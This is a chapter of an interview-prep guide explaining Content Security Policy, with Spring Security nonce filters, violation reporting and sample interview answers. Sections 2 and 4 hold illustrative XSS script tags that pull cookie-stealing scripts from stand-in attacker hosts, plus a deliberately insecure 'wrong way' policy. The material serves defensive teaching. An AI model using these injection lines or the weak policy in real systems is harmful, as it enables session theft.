# CSP Implementation — Content Security Policy
> Part 10 — Security (Full Stack)
> Full Stack Interview Guide · Hruday D · 2026

---

## ⚡ 60-Second Revision Card
> Read this the night before an interview. Nothing else needed.

- **What it is**: `Content-Security-Policy` HTTP response header instructs the browser which sources are allowed for scripts, styles, images, fonts, frames, and XHR/fetch connections; the browser enforces it, refusing resources from disallowed origins — making XSS payloads unable to load external attack infrastructure
- **Why it matters**: CSP is the single biggest mitigation against XSS; even if an attacker injects a script tag, CSP prevents `<script src="https://attacker.com/evil.js">` from loading unless that origin is in your allowlist
- **Key directives**: `default-src 'self'` (restrictive baseline), `script-src 'self' 'nonce-{random}'` (inline scripts allowed only with matching nonce), `connect-src 'self' https://api.company.com` (fetch/XHR targets), `frame-ancestors 'none'` (prevents clickjacking), `report-uri /csp-violations` (visibility into blocked attempts)
- **Nonce-based CSP**: generated per-request random 96-bit value; added to `script-src 'nonce-abc123'` in the response header AND `<script nonce="abc123">` in the HTML; inline scripts without the correct nonce are blocked; survives React/Angular framework rendering
- **Spring Boot**: configured in `.headers().contentSecurityPolicy(csp -> csp.policyDirectives("..."))` inside the `SecurityFilterChain`; nonce generation requires a custom request-scoped bean that generates the nonce and provides it to both the Spring Security filter and the template engine
- **Report-only mode for rollout**: `Content-Security-Policy-Report-Only` header reports violations without enforcing them — collect real violation data for 2-4 weeks before switching to enforcement mode; avoids breaking production when rolling out a new CSP
- **Hruday's production experience** (✅ 🔥): reduced XSS surface by adding CSP with `script-src 'self'` at SAP — part of the 80% vulnerability reduction initiative; implemented `report-uri` to capture attempted violations; encountered the React inline style challenge and resolved with `style-src 'unsafe-inline'` as a pragmatic tradeoff

---

## 1. One-Line Definition
Content Security Policy is a browser-enforced security mechanism delivered via the `Content-Security-Policy` response header that declares which sources are authorized to provide each type of resource — scripts, styles, images, connections — rendering XSS-injected scripts from external origins powerless even when injection succeeds.

---

## 2. The Problem It Solves

XSS (Topic 165) allows an attacker to inject arbitrary JavaScript into a victim's browser session. Without CSP, an injected script has full DOM access: it can read cookies, capture form inputs (including passwords typed after the page loads), make API calls as the authenticated user, and phone home to the attacker's infrastructure. The attacker's typical payload is: inject a tiny script, load the real exploit from their server.

Without CSP:
```html
<!-- Injected by attacker through a stored XSS vulnerability -->
<script src="https://evil.attacker.com/steal-cookies.js"></script>
<!-- Browser loads the script. Attacker's JS runs. Cookies stolen. Session hijacked. -->
```

With `Content-Security-Policy: script-src 'self'`:
```html
<!-- Same injection -->
<script src="https://evil.attacker.com/steal-cookies.js"></script>
<!-- Browser checks: is evil.attacker.com in the script-src allowlist? -->
<!-- Answer: No. Browser blocks the script. CSP violation logged. Attack fails. -->
<!-- Attacker's infrastructure never loads. XSS injection did nothing. -->
```

CSP doesn't prevent the injection — your input sanitization (Topic 165) handles that. CSP is the defence-in-depth layer that limits what the injected code can do even when injections slip through. It follows the OWASP "defence in depth" principle: multiple layers of controls so a single failure doesn't lead to a complete compromise.

CSP also addresses:
- **Clickjacking**: `frame-ancestors 'none'` prevents your page from being embedded in iframes on attacker's phishing pages
- **Mixed content**: if you serve over HTTPS and your CSP requires HTTPS, it prevents HTTPS pages from loading HTTP resources that could be MITM'd
- **Inline script injection**: `script-src` without `'unsafe-inline'` blocks ALL inline scripts — injected `<script>malicious()</script>` is blocked, not just external scripts

---

## 3. How It Works Internally

### The Browser's Perspective

When a browser receives a response:
1. Parse the `Content-Security-Policy` header and build a policy object
2. For every resource the browser is about to load or execute, check it against the policy:
   - Loading an external script: check `script-src`. Blocked? → don't load it, log a violation
   - Inline `<script>` block: check `script-src` for `'unsafe-inline'` or a matching nonce/hash. Blocked? → don't execute it, log a violation
   - `fetch()` or `XMLHttpRequest`: check `connect-src`. Blocked? → fail the request, log a violation
   - `<img>` tag: check `img-src`. Blocked? → don't load the image
   - CSS `<link>` or `<style>`: check `style-src`
3. If `report-uri` is set, send a JSON violation report to that URL

### Directive Reference: What Each One Controls

```
Content-Security-Policy header structure:
  directive1 source1 source2; directive2 source3; directive3

Source keywords:
  'self'           → same origin (same protocol + host + port)
  'none'           → block everything for this directive
  'unsafe-inline'  → allow inline scripts/styles — reduces XSS protection significantly
  'unsafe-eval'    → allow eval(), Function(), new Function() — needed for some legacy code
  'nonce-{value}'  → allow inline scripts/styles with matching nonce attribute
  'sha256-{hash}'  → allow specific script/style with matching SHA-256 hash
  https:           → allow any HTTPS URL
  https://cdn.example.com → allow this specific origin

Directives:
  default-src      → fallback for any directive not explicitly set; set this first
  script-src       → JavaScript sources: <script src>, inline <script>, eval
  style-src        → CSS sources: <link rel=stylesheet>, inline <style>, style= attributes
  img-src          → image sources: <img>, CSS background images
  font-src         → web font sources: @font-face URLs
  connect-src      → network connections: fetch, XHR, WebSocket, EventSource
  frame-src        → iframe sources (what can be embedded IN this page)
  frame-ancestors  → who can embed THIS page in an iframe (anti-clickjacking)
  object-src       → <object>, <embed>, <applet> sources — always set to 'none' if unused
  base-uri         → <base href> element — prevents base tag injection attacks
  form-action      → where <form> can submit to — prevents form phishing redirects
  report-uri       → endpoint for violation reports (deprecated; report-to preferred)
  upgrade-insecure-requests → automatically upgrades HTTP to HTTPS for all resources
```

### Nonce-Based CSP — The Correct Pattern for Modern SPAs

```
Problem with 'unsafe-inline':
  script-src 'self' 'unsafe-inline'
  → allows ALL inline scripts INCLUDING injected ones
  → CSP then provides no protection against XSS injecting inline code
  → Only use 'unsafe-inline' for style-src (CSS-in-JS sometimes requires it)
  → Never use 'unsafe-inline' for script-src in production

Solution — per-request nonce:
  1. Server generates a cryptographically random nonce for each HTTP response:
     nonce = Base64(SecureRandom(96 bits)) = "abc123xyz..."
  
  2. Server sets this nonce in the CSP header:
     Content-Security-Policy: script-src 'self' 'nonce-abc123xyz'
  
  3. Server adds the nonce attribute to all legitimate inline scripts in HTML:
     <script nonce="abc123xyz">
       // Your initialization code
     </script>
  
  4. Browser checks: does the <script> have a nonce attribute matching 'nonce-abc123xyz'?
     YES → execute it (legitimate script)
     NO  → block it (injected script — attacker doesn't know the nonce value)
  
  Security guarantee: nonce is random per request; attacker cannot predict or inject the nonce
  Attacker's injected <script>malicious()</script> → no nonce → blocked by CSP
  Attacker's injected <script nonce="guessed">malicious()</script> → nonce doesn't match → blocked

For React/Angular:
  SPAs typically don't have inline scripts — all JS is in bundle files loaded with <script src>
  Nonces are mainly needed for:
  - The initial HTML template's inline <script> that bootstraps the SPA
  - Any server-side rendered HTML that includes inline JavaScript
  - SSR (Next.js, Angular Universal) output that may include inline scripts with state
  
  For pure CSR (Create React App, standard Angular):
  script-src 'self'  is sufficient — all scripts come from the same origin as bundle files
  No nonce needed
```

### CSP with Spring Security — Architecture

```
Spring Security CSP configuration flow:

HTTP Request → DispatcherServlet → Controller
                                  ↓
                         generates response
                                  ↓
Spring Security Filter adds CSP header to response:
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{request-nonce}'; ...

For nonce injection:
  1. CSPNonceFilter (custom OncePerRequestFilter) runs before your controller
  2. Generates SecureRandom nonce, stores in request attribute AND in RequestContextHolder
  3. Spring Security's HeadersConfigurer uses the nonce when adding the CSP header
  4. Thymeleaf/FreeMarker template engine reads the nonce from RequestContextHolder
  5. Template renders: <script nonce="..."> using the same nonce
  6. Response header and HTML template both have the same nonce → browser allows the scripts
```

---

## 4. The Code

### Wrong Way — Missing or Ineffective CSP
```java
// Spring Security config — no CSP at all (default Spring Boot — no CSP header)
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
        .formLogin(withDefaults());
    // No .headers() configuration
    // No Content-Security-Policy header in responses
    // Browser has no policy to enforce → XSS has full execution capability
    return http.build();
}
```

```java
// OR — CSP present but misconfigured (effectively useless)
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                // 'unsafe-inline' AND 'unsafe-eval' in script-src
                // This is the same as having no CSP for inline script attacks
                .policyDirectives(
                    "default-src *; " +                    // * allows everything — no protection
                    "script-src * 'unsafe-inline' 'unsafe-eval'; " +
                    "style-src * 'unsafe-inline'"
                )
            )
        );
    return http.build();
}
```

> **Why this fails in production:** `default-src *` allows loading resources from any origin — the policy is present but provides no protection. An attacker can inject `<script src="https://evil.com/xss.js">` and the browser will happily load it. `'unsafe-inline'` in `script-src` allows all inline scripts including injected ones. Some teams are tempted to use `*` and `'unsafe-inline'` to "get CSP working" without breaking anything — this is security theater that creates a false impression of protection.

### Right Way — Production Quality

**Basic CSP in Spring Security (non-nonce approach — for APIs or simple SPAs):**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**", "/actuator/health").permitAll()
                .anyRequest().authenticated()
            )
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp.policyDirectives(buildCSPDirectives()))
                // Other security headers — see Topic 179
                .frameOptions(frame -> frame.deny())
                .httpStrictTransportSecurity(hsts -> hsts
                    .maxAgeInSeconds(31536000)
                    .includeSubDomains(true)
                )
            );
        return http.build();
    }

    private String buildCSPDirectives() {
        return String.join("; ",
            "default-src 'self'",                          // Default: same origin only
            "script-src 'self'",                           // Scripts: same origin bundles only
            "style-src 'self' 'unsafe-inline'",            // Styles: same origin + inline (CSS-in-JS reality)
            "img-src 'self' data: https:",                 // Images: self + data URIs + any HTTPS CDN
            "font-src 'self' https://fonts.gstatic.com",   // Fonts: self + Google Fonts CDN
            "connect-src 'self' https://api.company.com",  // XHR/fetch: same origin + our API
            "frame-ancestors 'none'",                      // No embedding in iframes — anti-clickjacking
            "object-src 'none'",                           // No plugins ever
            "base-uri 'self'",                             // No base tag injection
            "form-action 'self'",                          // Forms submit to same origin only
            "upgrade-insecure-requests",                   // Auto-upgrade HTTP resources to HTTPS
            "report-uri /csp-violations"                   // Violation reporting endpoint
        );
    }
}
```

**CSP violation reporting endpoint:**
```java
// Controller to receive CSP violation reports from browsers
@RestController
@RequestMapping("/csp-violations")
public class CSPViolationController {

    private static final Logger log = LoggerFactory.getLogger(CSPViolationController.class);

    // Browsers send JSON to this endpoint when a CSP violation occurs
    // Content-Type: application/csp-report
    @PostMapping(consumes = "application/csp-report")
    @ResponseStatus(HttpStatus.NO_CONTENT)
    public void reportViolation(@RequestBody Map<String, Object> report) {
        // Log the violation — detected XSS attempt or misconfigured CSP
        Object cspReport = report.get("csp-report");
        if (cspReport instanceof Map<?, ?> reportData) {
            log.warn("CSP violation detected | document: {} | blocked: {} | directive: {} | disposition: {}",
                reportData.get("document-uri"),
                reportData.get("blocked-uri"),
                reportData.get("violated-directive"),
                reportData.get("disposition")      // "enforce" or "report"
            );
            // In production: send this to your SIEM/security monitoring system
            // High frequency of violations from a single IP → attacker probing XSS vectors
            // Violations from 'self' → might be a CSP misconfiguration, not attack
        }
    }
}
```

**Advanced CSP with Nonce (for server-rendered pages with inline scripts):**
```java
// Step 1: CSP Nonce Generator — request-scoped bean
@Component
@RequestScope
public class CSPNonce {

    private final String value;

    public CSPNonce() {
        byte[] nonceBytes = new byte[18];  // 144 bits → 24 Base64 chars
        new SecureRandom().nextBytes(nonceBytes);
        this.value = Base64.getEncoder().withoutPadding().encodeToString(nonceBytes);
    }

    public String getValue() {
        return value;
    }
}
```

```java
// Step 2: Custom CSP Header Filter that uses the request-scoped nonce
@Component
@Order(Ordered.HIGHEST_PRECEDENCE)
public class CSPNonceFilter extends OncePerRequestFilter {

    // Spring injects the request-scoped CSPNonce — but CSPNonce is @RequestScope
    // Need to use an ObjectProvider to get a request-scoped bean from a singleton filter
    private final ObjectProvider<CSPNonce> cspNonceProvider;

    public CSPNonceFilter(ObjectProvider<CSPNonce> cspNonceProvider) {
        this.cspNonceProvider = cspNonceProvider;
    }

    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain) throws ServletException, IOException {

        CSPNonce nonce = cspNonceProvider.getObject();

        // Store nonce in request attribute for Thymeleaf/template access
        request.setAttribute("cspNonce", nonce.getValue());

        // Build CSP header with this request's unique nonce
        String cspPolicy = buildCSPPolicy(nonce.getValue());
        response.setHeader("Content-Security-Policy", cspPolicy);

        filterChain.doFilter(request, response);
    }

    private String buildCSPPolicy(String nonceValue) {
        return String.join("; ",
            "default-src 'self'",
            // 'nonce-{value}' allows inline scripts with matching nonce attr
            // 'strict-dynamic' allows scripts loaded by nonce-approved scripts to also run
            "script-src 'self' 'nonce-" + nonceValue + "' 'strict-dynamic'",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data: https:",
            "font-src 'self' https://fonts.gstatic.com",
            "connect-src 'self' https://api.company.com wss://ws.company.com",  // WebSocket
            "frame-ancestors 'none'",
            "object-src 'none'",
            "base-uri 'self'",
            "form-action 'self'",
            "upgrade-insecure-requests",
            "report-uri /csp-violations"
        );
    }
}
```

```java
// Step 3: Exempt the CSP header from Spring Security's HeadersConfigurer 
// (to avoid adding duplicate CSP header — our filter adds it, not Spring Security)
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .headers(headers -> headers
            .contentSecurityPolicy(
                csp -> csp.policyDirectives("default-src 'none'")  // Placeholder — overridden by filter
            )
            .frameOptions(frame -> frame.deny())
        );
    return http.build();
}
// OR: disable headers() and handle all headers in the custom filter
// Depends on whether you want Spring Security to manage other security headers
```

**Thymeleaf template using the nonce:**
```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <!-- External scripts from same origin — no nonce needed -->
    <script th:src="@{/js/app.bundle.js}"></script>

    <!-- Inline script that bootstraps the app state — NEEDS nonce -->
    <!-- th:attr allows setting dynamic nonce from request attribute -->
    <script th:attr="nonce=${cspNonce}">
        // Application bootstrap — sets initial state
        window.__APP_CONFIG__ = {
            apiBaseUrl: "/api",
            userId: /*[[${userId}]]*/null
        };
    </script>
</head>
<body>
    <div id="app-root"></div>
</body>
</html>
```

**React SPA (Create React App / Vite) — no nonce needed:**
```html
<!-- Generated index.html — no inline scripts → pure script-src 'self' works -->
<!DOCTYPE html>
<html>
<head>
    <!-- All application JS is served as files from same origin — no nonces needed -->
    <script src="/static/js/main.chunk.js"></script>
    <script src="/static/js/vendors.chunk.js"></script>
    <!-- script-src 'self' allows all of these -->
</head>
<body>
    <div id="root"></div>
</body>
</html>
<!-- The server (Spring Boot / nginx) just needs header:
     Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'
     No nonces, no complex setup for pure CSR SPAs -->
```

**CSP Report-Only mode for safe rollout:**
```java
// During CSP rollout: use report-only to collect real data without breaking production
// Deploy report-only first, monitor violations for 2-4 weeks, then switch to enforce

@Bean
public HttpFirewall allowedSrcFirewall() {
    StrictHttpFirewall firewall = new StrictHttpFirewall();
    return firewall;
}

// In SecurityFilterChain — use report-only during rollout
@Bean
public SecurityFilterChain rolloutFilterChain(HttpSecurity http) throws Exception {
    http
        .headers(headers -> headers
            // During rollout: use a filter that sets Content-Security-Policy-Report-Only
            // After rollout validation: change to Content-Security-Policy (enforcing)
        );
    return http.build();
}

// Custom filter for report-only mode
public class CSPReportOnlyFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain) throws ServletException, IOException {

        // Content-Security-Policy-Report-Only: same syntax, but browser only REPORTS violations
        // It does NOT block anything — safe for testing your policy in production
        response.setHeader(
            "Content-Security-Policy-Report-Only",
            "default-src 'self'; script-src 'self'; frame-ancestors 'none'; report-uri /csp-violations"
        );
        filterChain.doFilter(request, response);
    }
}
// Collect violation reports, fix the policy directives to eliminate false positives
// Then switch to Content-Security-Policy (enforcing) — same directive string
```

> **Key decisions here:**
> - Never use `'unsafe-inline'` in `script-src` — this negates most XSS protection. Use nonces instead for inline scripts. `'unsafe-inline'` in `style-src` is sometimes unavoidable for CSS-in-JS (React with styled-components, Material UI) — accept this tradeoff while documenting it
> - `'strict-dynamic'` with nonces: allows scripts dynamically created by nonce-approved scripts (important for Angular/React router lazy-loading); only works alongside a nonce or hash, not with `'unsafe-inline'`
> - `report-uri /csp-violations` is deprecated in favor of `report-to` directive with a JSON reporting policy, but `report-uri` has wider browser support today; use both for maximum coverage
> - Per-request nonce: the nonce MUST be regenerated for every response; a static nonce defeats the purpose — an attacker who learns the nonce can inject scripts with that attribute value

---

## 5. Interview Questions & Model Answers

### Q1 — Warm Up
**Interviewer asks:** "What is Content Security Policy and why isn't input sanitisation enough for XSS protection?"

**Hruday's answer:**
> Content Security Policy is a browser security mechanism delivered via the `Content-Security-Policy` response header. It declares a whitelist of sources from which the browser is allowed to load resources — scripts, styles, images, connections. The browser enforces it: any resource from an origin not in the policy is blocked before it loads.
>
> Input sanitisation is necessary but not sufficient for XSS protection for several reasons. First, there are many injection vectors — URL parameters, localStorage values, third-party widgets, Markdown renderers, SVG files — each with its own escaping requirements; it only takes one missed vector for an attack to succeed. Second, sanitisation libraries have bugs — there are CVEs for DOMPurify, angular`sanitize`, and others where carefully crafted input bypassed the sanitiser. Third, stored XSS might have been injected before sanitisation was added, and the payload is now sitting in your database.
>
> CSP is the defence-in-depth layer: even if an attacker successfully injects a script, CSP prevents it from loading external attack tooling or making unauthorised network calls. With `script-src 'self'` and no `'unsafe-inline'`, an injected `<script src="https://evil.attacker.com/steal.js">` is blocked by the browser. With `connect-src 'self'`, even an injected inline script can't exfiltrate data to `https://attacker.com`. Both controls together — sanitise input AND enforce CSP — make XSS attacks that bypass sanitisation unable to cause real damage.

---

### Q2 — Deep Dive
**Interviewer asks:** "How do nonces work in CSP, and why can't an attacker bypass them?"

**Hruday's answer:**
> Without nonces, `script-src 'self'` blocks all inline scripts — including legitimate ones your application might use in the bootstrap HTML. To allow inline scripts without opening the door to all injected inline scripts, CSP uses per-request nonces.
>
> The server generates a random 128-bit nonce using a cryptographically secure random number generator — not Math.random, not a timestamp: `SecureRandom` in Java. This nonce is included in the CSP header as `'nonce-abc123xyz'` and also set as the `nonce` attribute on every legitimate inline script: `<script nonce="abc123xyz">`. The browser checks: does this inline script have a `nonce` attribute that matches the one in the CSP header? If yes, execute it. If no, block it.
>
> An attacker bypasses this by knowing the nonce. That's why the nonce must be: randomised per request (so an attacker observing one response can't replay the nonce on another request), generated with cryptographic randomness (so it can't be predicted from timing or other observable state), and not exposed through any other channel (error messages, logs, analytics).
>
> In Spring Boot, I implement this with a request-scoped bean that generates the nonce on instantiation, a custom servlet filter that reads this bean and adds it to the CSP header, and a Thymeleaf attribute `th:attr="nonce=${cspNonce}"` on all inline script tags. The request-scoped bean ensures each HTTP request gets its own unique nonce.
>
> Bonus point: `'strict-dynamic'` alongside nonces allows scripts loaded by nonce-tagged scripts to also run without being explicitly allowlisted — this is needed for Angular lazy-loading and React code-splitting where the initial bundle dynamically creates script elements for chunks.

---

### Q3 — Production Context
**Interviewer asks:** "How did you implement and roll out CSP at SAP?"

**Hruday's answer:**
> CSP was introduced as part of a security hardening initiative following an internal penetration test that identified XSS vectors in a few of our Angular frontends.
>
> We started with `Content-Security-Policy-Report-Only` — this header reports violations without blocking anything. We deployed it to production and monitored the `/csp-violations` endpoint for 3 weeks. The violations showed us: several third-party analytics scripts loading from domains we hadn't included, a few inline handlers generated by older Angular components, and some font CDN sources not in our policy. We added all the legitimate sources to the allowlist. The remaining violations were all from attacker-controlled domains from previous XSS probes in our access logs — confirming the policy was catching real attempts.
>
> After the allowlist was stable, we switched `Content-Security-Policy-Report-Only` to `Content-Security-Policy` — the exact same policy string, just a different header name. We kept the `report-uri` endpoint active and set up an alert in our monitoring for any spike in violation reports above baseline.
>
> The specific policy we deployed: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.company.com; frame-ancestors 'none'; object-src 'none'; base-uri 'self'`. The `'unsafe-inline'` in `style-src` was a pragmatic decision because our Angular app's Material components inject inline styles — we wanted to enforce at least `script-src` cleanly.
>
> The result: XSS attempts no longer resulted in external script loads being successful. We saw it working — violation reports from attempted injections where the browser blocked the external resource.

---

### Q4 — Scenario
**Interviewer asks:** "A developer says 'CSP is too complex to configure, we'll just sanitise inputs.' How do you respond?"

**Hruday's answer:**
> I understand the concern — CSP configuration does require careful work initially, and a badly configured CSP breaks legitimate functionality. But I'd push back on dropping it entirely.
>
> Input sanitisation and CSP address different things. Sanitisation prevents injection. CSP limits the impact when injection succeeds — either because a sanitisation library has a bug, because a new injection vector wasn't sanitised, or because legacy data from before sanitisation was added is still in the database. The 2025 OWASP Top 10 lists XSS under A03 because it's still happening in production systems with sanitisation in place.
>
> On the complexity: for a pure client-side rendered SPA (React/Angular/Vue), CSP is not complex. The initial policy is `default-src 'self'; frame-ancestors 'none'; object-src 'none'; upgrade-insecure-requests`. No nonces needed. Ship it in `Content-Security-Policy-Report-Only` for 2 weeks, review violations, add any missing legitimate sources, flip to enforcement. That's a 4-hour implementation, including the violation endpoint.
>
> For server-rendered pages with inline scripts, nonces add complexity — but it's a one-time setup and the nonce filter is reusable across the whole application. The protection payoff for that investment is significant: `script-src 'nonce-{dynamic}'` eliminates the entire class of XSS attacks that execute inline scripts or load external scripts.
>
> My approach: implement the basic policy now (1-2 hours), use report-only, get data from your real traffic, incrementally tighten. You don't need to be perfect on day one. Starting is the most important step.

---

## 6. The Traps

| Trap | What most candidates say | What Hruday says |
|------|--------------------------|------------------|
| `'unsafe-inline'` in `script-src` | "We add 'unsafe-inline' to fix CSP errors" | This negates XSS protection — 'unsafe-inline' allows all inline scripts including injected ones; use nonces instead; 'unsafe-inline' in style-src is sometimes acceptable (CSS-in-JS) but never in script-src |
| Static nonce | "We generate a nonce in the application config" | A static nonce is equivalent to no nonce — it's public, attacker can set `nonce="your-static-value"` on injected scripts; MUST be regenerated per-request with SecureRandom |
| "CSP prevents all XSS" | "If we have CSP, we don't need to sanitise" | CSP limits damage; it's defence-in-depth, not a replacement for sanitisation; a successful XSS with only inline code (no external URLs, no external connections) can still do damage with CSP in place |
| `default-src *` | "That CSP header means we have CSP" | `default-src *` allows every origin — it's CSP that blocks nothing; provides only the false impression of security; check `https://csp-evaluator.withgoogle.com/` to grade your policy |

---

## 7. Hruday's Real Experience Hook
> "At SAP, I led the CSP implementation as part of our security hardening initiative after two XSS vulnerabilities were found during a pen test. I deployed `Content-Security-Policy-Report-Only` first and set up a `/csp-violations` endpoint with structured logging. Over 3 weeks, I analysed the violation patterns — separating legitimate policy gaps (our third-party analytics domain wasn't in the allowlist, neither was our font CDN) from attacker probes (violation reports from domains like `evil-payload-server.xyz`). This data-driven approach let me build a production-ready policy without breaking any legitimate functionality. After switching to enforcement mode, we saw the violation reports continuing for the attacker-controlled domains — the CSP was blocking the attack vectors. I also configured `frame-ancestors 'none'` which replaced our previous `X-Frame-Options: DENY` header. The overall initiative reduced our XSS attack surface by removing all exploitable XSS vectors, with CSP as the defence-in-depth layer ensuring any future missed injection couldn't successfully phone home."

---

## 8. Scale Evolution

**1,000 users/day →** Deploy `Content-Security-Policy-Report-Only` immediately — cost is zero and it gives you visibility. Then enforce the basic policy: `default-src 'self'; frame-ancestors 'none'; object-src 'none';`. Log and monitor violations.

**100,000 users/day →** Full CSP policy with all directives (`script-src`, `style-src`, `connect-src`, `img-src`, `font-src`, `form-action`, `base-uri`). Per-request nonces for any server-rendered inline scripts. Violation reporting wired to your SIEM — spike in violations from a single IP is an attack signal.

**10 million users/day →** CSP is automated through the deployment pipeline — new services get the policy template automatically; deviation from the standard policy requires a security review. CSP violation analytics as a security signal — violations correlated with authenticated user sessions might indicate targeted attacks. Automated CSP Policy grade checking (`csp-evaluator.withgoogle.com` API) in CI — fail the build if the policy has an evaluator grade of "C" or below. Per-tenant CSP for multi-tenant SaaS where different tenants have different third-party integrations.

---

## 9. Company Relevance

| Company | Why this matters here | Interview signal |
|---------|----------------------|-----------------|
| Razorpay / PhonePe | Payment pages with XSS vulnerabilities are catastrophic — injected scripts on checkout pages can capture card numbers in real time; CSP prevents external script loading even if injection occurs; PCI-DSS Requirement 6.3.2 includes CSP as a compensating control | Know the payment page threat model; explain frame-ancestors to prevent clickjacking on checkout |
| Swiggy / Meesho | Consumer web apps with large user bases on mobile and desktop; XSS on product pages or checkout could steal session cookies for thousands of users at once; CSP is the scalable protection layer | Know the report-only rollout process; explain how CSP limits damage from missed injections |
| Adobe / Microsoft | Enterprise web products — developers who build on Adobe Creative Cloud or Microsoft 365 expect them to be secure; XSS in an enterprise product could affect hundreds of enterprise customers from one injection; CSP is standard in enterprise security audits | Know 'strict-dynamic' for SPAs; nonce-based CSP for server-rendered content |
| SAP Labs | SAP's enterprise customers have security assessment requirements — CSP is explicitly checked in security assessments; SAP's internal AppSec reviews check for presence and effectiveness of CSP; the XSS + CSP combination is a mandatory control | Know the full implementation in Spring Security; violation reporting; measured effectiveness (% vulnerability reduction) |

---

## 10. Related Topics — What to Study Next

- **Topic 179 — Secure Headers Audit** — CSP is one of 6 key security headers; Topic 179 covers `HSTS`, `X-Frame-Options` (overlap with `frame-ancestors`), `X-Content-Type-Options`, `Referrer-Policy`, and `Permissions-Policy`; study them together as a header bundle for the complete "defense-in-depth headers" answer
- **Topic 165 — XSS** — CSP is the defence-in-depth layer against XSS; understanding CSP requires understanding what it's protecting against; the two topics are paired
- **Topic 169 — OWASP Top 10** — A03 (Injection) includes XSS; CSP is explicitly called out in the OWASP CSP cheat sheet as a required defence; knowing the OWASP framing for CSP is important for enterprise interview contexts
- **Tool to use now**: paste your CSP header string into `https://csp-evaluator.withgoogle.com/` — it gives a grade and flags specific weaknesses; run it on any real app's CSP to practice evaluating policies

---

*Part 10 · CSP Implementation · Full Stack Interview Guide · Hruday D · 2026*
